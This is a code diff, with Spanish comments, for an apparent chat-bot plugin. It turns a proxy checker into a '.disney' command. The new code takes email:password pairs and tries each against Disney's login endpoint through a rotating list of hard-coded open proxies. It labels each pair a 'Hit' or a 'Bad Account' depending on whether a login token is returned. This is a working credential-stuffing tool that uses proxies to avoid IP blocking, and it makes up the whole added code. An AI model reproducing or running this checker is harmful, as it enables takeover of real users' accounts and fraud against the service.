@@ -1,46 +1,90 @@
 import axios from 'axios';
 
-let handler = async (m, { conn, command, text, args, usedPrefix }) => {
-  if (command === 'proxy') {
-    if (!text) {
-      return conn.reply(m.chat, 'Por favor, ingresa una IP y puerto en formato: /proxy ip:puerto', m);
+// Lista de proxies para usarlas durante la verificación
+const proxies = [
+  '180.178.37.114:80',
+  '47.90.167.27:8081',
+  '71.14.218.2:8080',
+  '47.91.110.148:80'
+];
+
+// Función para verificar si el proxy está vivo
+async function verificarProxy(ipPuerto, url = 'http://www.google.com') {
+  const proxy = `http://${ipPuerto}`;
+  const proxies = {
+    http: proxy,
+    https: proxy,
+  };
+
+  try {
+    // Intentar hacer una solicitud a la URL utilizando el proxy
+    const response = await axios.get(url, { proxy: { host: ipPuerto.split(':')[0], port: parseInt(ipPuerto.split(':')[1]) }, timeout: 5000 });
+
+    // Verificar si la respuesta es exitosa (código 200)
+    if (response.status === 200) {
+      return true; // Proxy vivo
+    } else {
+      return false; // Proxy no vivo
     }
+  } catch (error) {
+    return false; // Proxy muerto o no se puede conectar
+  }
+}
 
-    const proxy = text.trim();
-    const [ip, port] = proxy.split(':');
+// Función para verificar credenciales usando proxies
+async function verificarCredenciales(email, password) {
+  for (const proxy of proxies) {
+    // Verificar si el proxy está vivo
+    const estaVivo = await verificarProxy(proxy);
+    if (estaVivo) {
+      console.log(`Usando el proxy ${proxy} para verificar credenciales.`);
+      try {
+        // Realizar la solicitud de verificación al servidor Disney
+        const response = await axios.post('https://global.edge.bamgrid.com/idp/login', {
+          email: email,
+          password: password,
+        }, {
+          headers: {
+            'content-type': 'application/json',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
+          },
+          proxy: {
+            host: proxy.split(':')[0],
+            port: parseInt(proxy.split(':')[1]),
+          },
+        });
 
-    if (!ip || !port) {
-      return conn.reply(m.chat, 'Formato incorrecto. Debes ingresar la IP y puerto en formato: ip:puerto', m);
-    }
-
-    // Verificar si la proxy está viva y obtener la información de la IP
-    try {
-      const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,region,city,isp`);
-
-      // Hacer una solicitud para verificar si la proxy está "live" (viva)
-      const proxyResponse = await axios.get(`http://${ip}:${port}`);
-
-      // Si la proxy está activa, devolver la respuesta con la información del país
-      if (proxyResponse.status === 200) {
-        const proxyInfo = response.data;
-        const country = proxyInfo.country || 'Desconocido';
-        const region = proxyInfo.region || 'Desconocido';
-        const city = proxyInfo.city || 'Desconocido';
-        const isp = proxyInfo.isp || 'Desconocido';
-
-        conn.reply(m.chat, `🔹 **Proxy Live** 🔹\n\nIP: ${ip}\nPuerto: ${port}\nUbicación: ${city}, ${region}, ${country}\nProveedor: ${isp}`, m);
-      } else {
-        conn.reply(m.chat, `❌ **Proxy Died** ❌\n\nLa proxy ${ip}:${port} está caída. Intenta con otra.` , m);
+        // Verificar si la respuesta es un hit
+        if (response.data.includes('id_token')) {
+          return `Hit para ${email}:${password} usando el proxy ${proxy}`;
+        } else {
+          return `Bad Account para ${email}:${password} usando el proxy ${proxy}`;
+        }
+      } catch (err) {
+        console.error(`Error con el proxy ${proxy}: ${err.message}`);
       }
-    } catch (error) {
-      // Si hay un error, probablemente la proxy esté caída
-      console.error(error);
-      conn.reply(m.chat, `❌ **Proxy Died** ❌\n\nNo se pudo conectar con la proxy ${ip}:${port}. Intenta con otra.` , m);
     }
+  }
+
+  return `Todos los proxies están muertos. No se pudo verificar las credenciales para ${email}:${password}.`;
+}
+
+// Handler para el comando .disney
+let handler = async (m, { conn, command, text, args, usedPrefix }) => {
+  if (!text) return conn.reply(m.chat, 'Por favor, ingresa las credenciales en formato "email:pass".', m);
+
+  const [email, password] = text.split(':');
+  if (!email || !password) return conn.reply(m.chat, 'Formato incorrecto. Usa el formato "email:pass".', m);
+
+  try {
+    const resultado = await verificarCredenciales(email, password);
+    conn.reply(m.chat, resultado, m);
+  } catch (error) {
+    console.error('Error en la verificación:', error);
+    conn.reply(m.chat, 'Ocurrió un error al verificar las credenciales. Intenta nuevamente.', m);
   }
 };
 
-// Definir el comando
-handler.command = ['proxy'];
+handler.command = ['disney']; // Comando que activará este handler
 
 export default handler;
